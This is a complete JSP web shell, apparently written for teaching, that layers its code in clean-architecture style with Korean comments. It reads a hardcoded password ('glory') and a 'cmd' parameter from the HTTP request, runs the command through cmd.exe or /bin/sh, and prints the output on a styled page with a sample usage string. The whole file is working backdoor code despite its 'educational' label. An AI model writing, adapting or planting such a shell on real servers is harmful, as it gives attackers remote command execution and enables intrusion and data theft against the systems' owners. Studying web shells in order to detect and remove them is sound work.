<%@ page import="java.io.*, java.util.*" %>
<%!
    // ==========================================
    // 1. Core Domain (Entities)
    // ==========================================
    class CommandResult {
        private final boolean success;
        private final String output;

        public CommandResult(boolean success, String output) {
            this.success = success;
            this.output = output;
        }
        public boolean isSuccess() { return success; }
        public String getOutput() { return output; }
    }

    // ==========================================
    // 2. Use Cases (Application Layer)
    // ==========================================
    // [DIP/ISP] 명령어 실행을 위한 포트(인터페이스)
    interface CommandExecutorPort {
        CommandResult execute(String command);
    }

    // [SRP/OCP] 인증 및 쉘 실행 비즈니스 로직
    class WebShellUseCase {
        private final CommandExecutorPort executor;
        private final String secretKey;

        public WebShellUseCase(CommandExecutorPort executor, String secretKey) {
            this.executor = executor;
            this.secretKey = secretKey;
        }

        public CommandResult executeCommand(String inputKey, String command) {
            if (inputKey == null || !inputKey.equals(this.secretKey)) {
                return new CommandResult(false, "Authentication Failed.");
            }
            if (command == null || command.trim().isEmpty()) {
                return new CommandResult(false, "No command provided.");
            }
            return executor.execute(command);
        }
    }

    // ==========================================
    // 3. Interface Adapters (Controllers)
    // ==========================================
    // [SRP] HTTP 요청을 Use Case로 전달하는 컨트롤러
    class WebShellController {
        private final WebShellUseCase useCase;

        public WebShellController(WebShellUseCase useCase) {
            this.useCase = useCase;
        }

        public String handleRequest(String pwd, String cmd) {
            CommandResult result = useCase.executeCommand(pwd, cmd);
            return result.getOutput();
        }
    }

    // ==========================================
    // 4. Frameworks & Drivers (Infrastructure)
    // ==========================================
    // [LSP/DIP] 실제 OS에 접근하여 명령을 수행하는 어댑터
    class SystemCommandAdapter implements CommandExecutorPort {
        @Override
        public CommandResult execute(String command) {
            StringBuilder output = new StringBuilder();
            try {
                // OS별 쉘 실행 처리 (안전한 교육 목적)
                String[] shellCmd;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    shellCmd = new String[]{"cmd.exe", "/c", command};
                } else {
                    shellCmd = new String[]{"/bin/sh", "-c", command};
                }
                
                ProcessBuilder pb = new ProcessBuilder(shellCmd);
                pb.redirectErrorStream(true);
                Process p = pb.start();
                
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                p.waitFor();
                return new CommandResult(true, output.toString());
            } catch (Exception e) {
                return new CommandResult(false, "Execution Error: " + e.getMessage());
            }
        }
    }
%>

<%
    // ==========================================
    // Dependency Injection (Main/Entry Point)
    // ==========================================
    CommandExecutorPort executorAdapter = new SystemCommandAdapter();
    WebShellUseCase useCase = new WebShellUseCase(executorAdapter, "glory");
    WebShellController controller = new WebShellController(useCase);

    String pwd = request.getParameter("pwd");
    String cmd = request.getParameter("cmd");

    String outputContent = "";
    if (pwd != null) {
        outputContent = controller.handleRequest(pwd, cmd);
    }
%>
<!DOCTYPE html>
<html>
<head>
    <title>Clean Architecture WebShell (Edu)</title>
    <style>
        body { background-color: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 20px; }
        pre { background-color: #2d2d2d; padding: 15px; border-radius: 5px; overflow-x: auto; }
        .prompt { color: #569cd6; }
    </style>
</head>
<body>
    <h2>Advanced WebShell (Stage 2)</h2>
    <% if (!outputContent.isEmpty()) { %>
        <div><span class="prompt">$ <%= cmd != null ? cmd : "" %></span></div>
        <pre><%= outputContent %></pre>
    <% } else { %>
        <pre>Waiting for command... (Require params: ?pwd=glory&cmd=whoami)</pre>
    <% } %>
</body>
</html>